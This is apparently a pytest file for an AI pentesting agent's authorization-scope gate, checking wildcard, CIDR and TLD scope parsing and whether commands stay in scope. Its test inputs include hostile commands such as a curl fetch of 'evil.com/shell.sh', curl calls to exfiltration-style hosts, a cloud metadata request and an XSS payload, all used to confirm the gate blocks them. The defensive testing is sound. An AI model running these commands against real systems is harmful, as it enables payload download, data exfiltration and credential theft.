"""
Authorization-scope gate — the safety-critical unit tests.

Regression cases document every fail-closed fix: exfil TLDs (evil.top),
source-file false positives (main.go), XSS payload tokens (document.domain).
"""
import pytest

from services.agent.scope import parse_scope


@pytest.fixture()
def scope():
    return parse_scope("*.example.com, exclude admin.example.com, 10.0.0.0/24")


class TestParseScope:
    def test_wildcard_and_exclusion_and_cidr(self, scope):
        assert "example.com" in scope.wildcards
        assert "admin.example.com" in scope.exclusions
        assert any(str(n) == "10.0.0.0/24" for n in scope.cidrs)

    def test_empty_scope_is_empty(self):
        assert parse_scope("").is_empty
        assert parse_scope(None).is_empty


class TestHostInScope:
    def test_subdomain_of_wildcard(self, scope):
        assert scope.host_in_scope("app.example.com")
        assert scope.host_in_scope("example.com")

    def test_excluded_host(self, scope):
        assert not scope.host_in_scope("admin.example.com")

    def test_ip_in_cidr(self, scope):
        assert scope.host_in_scope("10.0.0.55")
        assert not scope.host_in_scope("192.168.1.1")

    def test_local_requires_explicit_grant(self, scope):
        assert not scope.host_in_scope("127.0.0.1")
        assert not scope.host_in_scope("localhost")
        assert parse_scope("127.0.0.1").host_in_scope("localhost")


class TestCheckCommand:
    # ── allowed ────────────────────────────────────────────────────────────
    def test_in_scope_url(self, scope):
        ok, bad = scope.check_command("curl -s https://app.example.com/api/v1/user")
        assert ok and not bad

    def test_ip_in_cidr_allowed(self, scope):
        ok, _ = scope.check_command("nmap -p 80 10.0.0.7")
        assert ok

    def test_filename_tokens_not_hosts(self, scope):
        ok, _ = scope.check_command("ffuf -w wordlist.txt -u http://app.example.com/FUZZ -o out.json")
        assert ok

    def test_source_files_are_not_hosts(self, scope):
        # Regression: 'main.go' / 'exploit.rb' were once refused as hosts.
        ok, _ = scope.check_command("python3 exploit.py && cat main.go && ruby x.rb")
        assert ok

    def test_js_payload_tokens_not_hosts(self, scope):
        # Regression: document.domain in an XSS payload was blocked as a host.
        ok, _ = scope.check_command(
            "curl 'http://app.example.com/search?q=<script>document.domain</script>'")
        assert ok
        ok2, _ = scope.check_command("echo 'String.fromCharCode(88,83,83)' > payload.txt")
        assert ok2

    # ── blocked (fail closed) ──────────────────────────────────────────────
    def test_out_of_scope_domain(self, scope):
        ok, bad = scope.check_command("curl http://evil.com/shell.sh")
        assert not ok and "evil.com" in bad

    def test_uncommon_tld_fail_closed(self, scope):
        # Regression: exfil.top / evil.club once slipped past a TLD allowlist.
        for host in ("exfil.top", "evil.club", "data.leak.icu", "evil.rs"):
            ok, bad = scope.check_command(f"curl http://{host}/x")
            assert not ok, host
            assert host in bad

    def test_metadata_ip_blocked(self, scope):
        ok, bad = scope.check_command("curl http://169.254.169.254/latest/meta-data/")
        assert not ok and "169.254.169.254" in bad

    def test_schemeless_host_still_checked(self, scope):
        ok, bad = scope.check_command("nmap -sV evil.com")
        assert not ok and "evil.com" in bad

    def test_out_of_scope_ip(self, scope):
        ok, bad = scope.check_command("curl http://192.168.1.1:8080/admin")
        assert not ok and "192.168.1.1" in bad


class TestTLDScope:
    """Whole-TLD bug-bounty scopes (".kz", "*.kz").

    Regression: the host regex needs a label before the dot, so these parsed
    to an EMPTY scope — every command was refused with no_scope while the
    operator believed a whole-TLD program was authorized.
    """

    def test_bare_tld_grant(self):
        s = parse_scope(".kz")
        assert not s.is_empty
        assert "kz" in s.tlds
        assert s.host_in_scope("tumar.kz")
        assert s.host_in_scope("shop.small-biz.kz")   # any depth under the TLD
        assert not s.host_in_scope("tumar.one")       # other TLD stays out
        assert not s.host_in_scope("kz.com")          # suffix, not substring

    def test_star_tld_grant(self):
        s = parse_scope("*.kz")
        assert "kz" in s.tlds and not s.is_empty

    def test_tld_mentioned_in_prose(self):
        s = parse_scope("all .kz domains, SMB targets only")
        assert "kz" in s.tlds
        assert s.host_in_scope("example.kz")

    def test_host_with_leading_dot_is_not_a_tld_grant(self):
        s = parse_scope(".example.com")
        assert "example" not in s.tlds          # no pseudo-TLD over-grant
        assert s.host_in_scope("example.com")   # still matched as a host

    def test_tld_exclusion(self):
        s = parse_scope(".kz, exclude .gov")
        assert "gov" in s.excluded_tlds
        assert not s.host_in_scope("portal.gov")

    def test_check_command_with_tld_scope(self):
        s = parse_scope(".kz")
        ok, bad = s.check_command("curl -s https://www.small-biz.kz/robots.txt")
        assert ok and not bad
        ok, bad = s.check_command("curl -s https://tumar.one/programs/7")
        assert not ok and "tumar.one" in bad
